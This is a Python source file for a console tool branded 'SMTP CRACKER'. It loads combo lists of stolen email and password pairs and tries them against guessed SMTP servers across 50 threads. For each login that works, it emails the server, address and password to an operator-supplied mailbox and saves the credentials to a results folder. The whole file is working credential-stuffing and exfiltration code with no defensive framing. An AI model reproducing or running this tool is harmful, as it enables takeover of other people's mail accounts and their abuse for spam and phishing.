from email.message import EmailMessage
import smtplib
import os,ctypes,sys,easygui
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import threading
import colorama
colorama.init()
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
class CRACKER:
    def interpolate_color(self,start, end, fraction):
        return tuple(int(start[i] + fraction * (end[i] - start[i])) for i in range(3))
    def color_gradient(self,text):
        gradient = ''
        start_rgb = (0, 0, 139)  # Dark Blue
        end_rgb = (135, 206, 250)  # Light Sky Blue
        num_lines = len(text.splitlines())  
        for i, line in enumerate(text.splitlines()):
            fraction = i / (num_lines - 1)
            color = self.interpolate_color(start_rgb, end_rgb, fraction)
            gradient += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{line}\033[0m\n"
        return gradient

    def center(self, var: str, space: int = None): 
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
        
    def ui(self):

        ctypes.windll.kernel32.SetConsoleTitleW(f'SMTP COOKIES CHECKER') 
        text = '''    
                                ███████╗███╗   ███╗████████╗██████╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
                                ██╔════╝████╗ ████║╚══██╔══╝██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
                                ███████╗██╔████╔██║   ██║   ██████╔╝    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
                                ╚════██║██║╚██╔╝██║   ██║   ██╔═══╝     ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
                                ███████║██║ ╚═╝ ██║   ██║   ██║         ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
                                ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝          ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                                                                                                                                                                                                                                                                                   
'''        
        print(self.center(self.color_gradient(text)))
                
    def __init__(self) -> None:
        self.valid = 0
        self.invalid = 0
        self.host = ["mail.", 'smtp.']
        self.port = [465, 587]
        self.glob_tr=True
    def smtp_testor(self, rec_email, email, pas, port, server,dt):
        try:
            sender = email
            recipient = rec_email
            message = f"{server}|{email}|{pas}|{port}|\nSMTP RECEIVED\n"
            email_message = EmailMessage()
            email_message["From"] = sender
            email_message["To"] = recipient
            email_message["Subject"] = "Test Email"
            email_message.set_content(message)

            with smtplib.SMTP(server, port,timeout=10) as smtp:
                smtp.connect(server,port)
                smtp.ehlo()
                if port == 587:
                    smtp.starttls()
                smtp.login(sender, pas)
                smtp.sendmail(sender, recipient, email_message.as_string())
            print(f"[*] VALID | {server} | {email} | {pas} | {port} |")
            with open(os.path.join(dt,f"[{server}].txt"),'a',encoding='utf-8',errors='ignore') as sn:
                sn.write(f"{server}|{port}|{email}|{pas}\n")
            return True
        except Exception as e:
            print(f"[*] INVALID | {server} | {email} | {pas} | {port} |")
            return False
    def format_mailcheck(self,mail,password,server,port,dt,recmail):
        if self.smtp_testor(recmail, mail, password, port, server,dt):
            self.valid += 1
        else:
            self.invalid += 1
    def chkmain_formart(self,combo,dt,recmail):
        ted=open(combo,errors="ignore",encoding='utf-8').readlines()
        with ThreadPoolExecutor(50) as m:
            for lin in ted:
                try:
                    server,port,username,passwrdo=lin.replace("\n",'').strip().split("|")
                    m.submit(self.format_mailcheck,username,passwrdo,server,int(port),dt,recmail)
                except:
                    continue
            t=threading.Thread(target=self.print_stats,args=(open(combo,errors='ignore',encoding='utf-8').readlines(),))
            t.daemon=True
            t.start()
            m.shutdown(wait=True)
            self.glob_tr=False
        
    def mailcheck(self, mail, pas, recmail,dt):
        smtp_server = str(mail).split("@")[1]
        for smt in self.host:
            for prt in self.port:
                server = smt + smtp_server
                if self.smtp_testor(recmail, mail, pas, prt, server,dt):
                    self.valid += 1
                else:
                    self.invalid += 1
    def smtprunner(self,combo,dt,recmail):
        ted=open(combo,errors="ignore",encoding='utf-8').readlines()
        with ThreadPoolExecutor(50) as m:
            for lin in ted:
                try:
                    mail,passp=lin.replace("\n","").split(":")
                    m.submit(self.mailcheck,mail,passp,recmail,dt)
                except:
                    continue
            t=threading.Thread(target=self.print_stats,args=(open(combo,errors='ignore',encoding='utf-8').readlines(),))
            t.daemon=True
            t.start()
            m.shutdown(wait=True)
            self.glob_tr=False
            
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[SMTP Checker]--|VALIDS:{self.valid}|INVALIDS:{self.invalid}|TOTAL LOGS FOLDER:{len(lin)}")
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
            
def datetimefolder1(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia 
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)      
def main():
    maximize_console_window()
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    os.system("cls")
    NF= CRACKER()
    NF.ui()
    print(NF.center(f""" 
                                            [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

                     [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER[EMAIL:PASS]         [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] CHECKER[SERVER|PORT|USERNAME|PASS]    
                                                                            
                                
                                            [{colorama.Fore.CYAN}3{colorama.Fore.RESET}] Exit 
    """))
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder1(current)
        c=easygui.fileopenbox(title="SMTP CRACKER SELECT EMAIL:PASS COMBO",filetypes=["*.txt"],multiple=False)
        tt=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER EMAIL TO RECIVE WORKING SMTP:")
        os.system("cls")
        NF.ui()
        NF.smtprunner(c,s,tt)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.GREEN+"SMTP CRACKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"WORKING ONES ARE SENT TO YOUR EMAIL AND OTHER VALID ARE SAVED IN FOLDER"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[SMTP CRACKER]- |VALIDS:{NF.valid}|INVALIDS:{NF.invalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder1(current)
        c=easygui.fileopenbox(title="SMTP CRACKER SELECT EMAIL:PASS COMBO",filetypes=["*.txt"],multiple=False)
        tt=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER EMAIL TO RECIVE WORKING SMTP:")
        os.system("cls")
        NF.ui()
        NF.chkmain_formart(c,s,tt)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.GREEN+"SMTP CRACKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"WORKING ONES ARE SENT TO YOUR EMAIL AND OTHER VALID ARE SAVED IN FOLDER"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[SMTP CRACKER]- |VALIDS:{NF.valid}|INVALIDS:{NF.invalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="3":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()
